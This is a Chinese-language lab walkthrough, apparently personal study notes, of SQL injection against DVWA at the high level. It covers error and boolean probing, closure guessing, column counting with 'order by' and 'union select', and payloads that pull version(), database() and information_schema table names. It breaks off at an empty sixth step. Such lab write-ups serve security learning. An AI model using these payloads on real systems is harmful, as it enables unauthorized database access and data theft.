# 第一步寻找交互页面

![20240914_204328](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\20240914_204328.png)



# 第二步：漏出存在探测

## 1、基于报错方式

![局部截取_20240914_205320](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\20240914_205320.png)

## 2、基于布尔进行测试

### 数字类型探测(能执行，没报错)

```
1and1=1
1and1=2
```

![image-20240914205100022](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240914205100022.png)



### 字符类型探测（报错，说明是''闭合）

```
'
"
```

![局部截取_20240914_205320](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\20240914_205320.png)

![20240914_213029](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\20240914_213029.png)

3、基于联合查询的测试

```
```



# 第三步：后台语句猜测：

```
由于没有数据库的报错信息。
我们无法确定闭合的方式：
可能性:
select * from table where id = ;
select * from table where id ='' ;
select * from table where id =" " ;
```



# 第四步 猜测显示位：

## 方法1： order by 排序方法

#### 猜测数字类型

```
1' order by 1#
```

![20240914_213630](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\20240914_213630.png)

![局部截取_20240914_214216](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_214216.png)

#### 猜测字符类型（确定闭合类型与最大显示位）

```
1' order by 1 #(回响发生变化，说明闭合类型)
1" order by 1 #（回响没变化，不是这个闭合类型）

在不断尝试变换
	1' order by 2 #
	1' order by 3 #
之间，发生回响变化。
说明最大显示位为第二列

```



![局部截取_20240914_213955](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_213955.png)

![局部截取_20240914_214517](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_214517.png)

![局部截取_20240914_214712](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_214712.png)



### 方式2： union 联合查询方式：

#### 数值类型猜测

```
1 union select 1 #

1 union select 1,2,3,4,5,6,7,8,9 #

都没有变化，说明，不是数值类型
```

![image-20240914215412819](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240914215412819.png)

![局部截取_20240914_215806](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_215806.png)



#### 字符串类型猜测

```
单引号字符猜测
1' union select 1 #
1' union select 1,2 #
不断的添加显示字段数，我们看到一个变化的临界点，就是1与1，2与1,2,3这个区间
说明1,2 是最大显示位。
```

![局部截取_20240914_220006](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_220006.png)



![局部截取_20240914_220330](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_220330.png)



# 第五步：利用显示位，输出数据库函数

```sql
按照国际惯例：先看版本
1' union select 1, version() #
查看当前数据库名称
1' union select 1, database() #
```

![局部截取_20240914_220946](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_220946.png)

![局部截取_20240914_221141](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_221141.png)



```sql
访问information_schema源库
获取全部的数据库名称 与数据表名称
报错：
1' union select table_schema, table_name from information_schema.tables #

指定字符集
1' union select (table_name collate utf8_unicode_ci),(table_schema collate utf8_unicode_ci) from information_schema.tables %23
```

![局部截取_20240914_222455](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_222455.png)

# 第六步：获取当前数据库表

